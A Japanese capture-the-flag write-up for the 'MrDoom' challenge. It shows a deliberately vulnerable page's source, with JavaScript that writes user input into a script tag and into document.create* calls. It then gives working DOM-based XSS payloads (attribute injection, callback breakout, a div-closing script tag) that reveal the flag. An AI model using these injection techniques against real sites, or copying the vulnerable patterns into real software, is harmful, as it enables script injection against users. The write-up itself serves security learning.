# Challenge Name: MrDoom

http://ec2-18-184-207-28.eu-central-1.compute.amazonaws.com/doom/

</textarea><input type=text value=x onmouseover=alert('flag1')>
とかでXSSが発火したのでXSSがあることがわかる。

ページソースをみる
***

~~~
<!doctype html>
<html>
	<head>
        <meta charset="UTF-8">
		<title>#Mr__Doo0M!#</title>
        <meta name=viewport content="width=device-width, initial-scale=1">
        <!--- style --->
        <style>
            html {
                background-color: teal;
            }
            .body {
                margin: 0;
                padding: 0;
                height: 100%;
                font-size:25px;
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                grid-gap: 10px;
                grid-auto-rows: 200px;
                grid-template-areas:
                    ". a a ."
                    ". a a .";
                }

            .container {
                grid-area: a;
                align-self: center;
                justify-self: center;
                width: auto;
                display: inline-block;
                text-align: center;
                width: 10em;
            }
            #protagonist {
                display: inline-block;
                font-size: 10em;
                animation: 2s hover infinite;
                user-select: none;
            }
            #shadow {
                display: inline-block;
                width: calc(100% - 4em);
                border-radius: 50%;
                background: black;
                opacity: 0.5;
                animation: 2s shrink infinite;
                user-select: none;
            }

            @keyframes hover {
                50% { transform: translateY(-0.1em); }
            }

            @keyframes shrink {
                50% {
                    width: calc(100% - 3em);
                    opacity: 0.4;
                }
            }

            #selector {
                margin-top: 2em;
                user-select: none;
            }
            .character {
                user-select: none;
                cursor: pointer;
            }
        </style>
        
        
    </head>
    <!--------------------------------------------
        letter1 : alert('flag1')
        letter2 : alert('flag2')
    ---------------------------------------------->
	<body style="text-align:center;">
       <div class="body">
        <div class="container">
            <img id="protagonist" src="./1.png"/>
            <span id="shadow">&nbsp;</span>
            <div id="selector">
                <span class="character">🤠</span>
                <span class="character">👻</span>
                <span class="character">🤔</span>
                <span class="character">🤯</span>
                <span class="character">💯</span>
            </div>
        </div>
        </div>

        <center><div>
                        <form method="POST" action="">
                <textarea id="string" type="text" name="data"></textarea><br>
                <input type="submit" value="submit"/>
            </form>
        
        </div>
        <div id="demo"></div></center>
        <!--- send Data 1 ----->
        <script>  
          
        var data = document.getElementById('string').value;
            function message1(s) {
                // try "data#data"
                var slice= s.split(/#/); 
		
                if (!(/^[a-zA-Z\[\]']*$/.test(slice[0]))){ return document.write('Invalid callback');}
		else{
                var obj = {'userdata': slice[1] };
                var json = '('+JSON.stringify(obj).replace(/</g, '\\u003c')+')';
                return document.getElementById('demo').innerHTML += "<script>"+slice[0]+json;}
            }
            console.log(message1(data));
      

            function message2(s) {
                // try "data#data"
                var d = s.split(/#/);
                var a = document.createElement('div');
                a.appendChild(document['create'+d[0]].apply(document, d.slice(1)));
                return document.getElementById('demo').innerHTML +=a.innerHTML;
            }
            console.log(message2(data));
        </script>
        


<!-----design resource --->

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script> 
<script src="jquery-asset.js"></script>
    
	</body>
</html>
~~~


***

~~~
        <script>  
          
        var data = document.getElementById('string').value;
            function message1(s) {
                // try "data#data"
                var slice= s.split(/#/); 
		
                if (!(/^[a-zA-Z\[\]']*$/.test(slice[0]))){ return document.write('Invalid callback');}
		else{
                var obj = {'userdata': slice[1] };
                var json = '('+JSON.stringify(obj).replace(/</g, '\\u003c')+')';
                return document.getElementById('demo').innerHTML += "<script>"+slice[0]+json;}
            }
            console.log(message1(data));
      

            function message2(s) {
                // try "data#data"
                var d = s.split(/#/);
                var a = document.createElement('div');
                a.appendChild(document['create'+d[0]].apply(document, d.slice(1)));
                return document.getElementById('demo').innerHTML +=a.innerHTML;
            }
            console.log(message2(data));
        </script>
~~~
***
DOMベースXSSです

Function1つ目

`'#';alert('flag1')//`
を入力した場合出力が下記のようになるので発火する

<script>'({"userdata":"';alert('flag1')//"}

前半部分
`FLAG{th!5_!5_my_l0ng_`

Function2つ目

var a = document.createElement('div');があるので<div>が生成されているため</div>で閉じる

`Comment#></div><script>alert('flag2')</script>`と入力すると発火する

`Fl4g_F0r_5w33t_D0M!!}`


`FLAG{th!5_!5_my_l0ng_Fl4g_F0r_5w33t_D0M!!}`
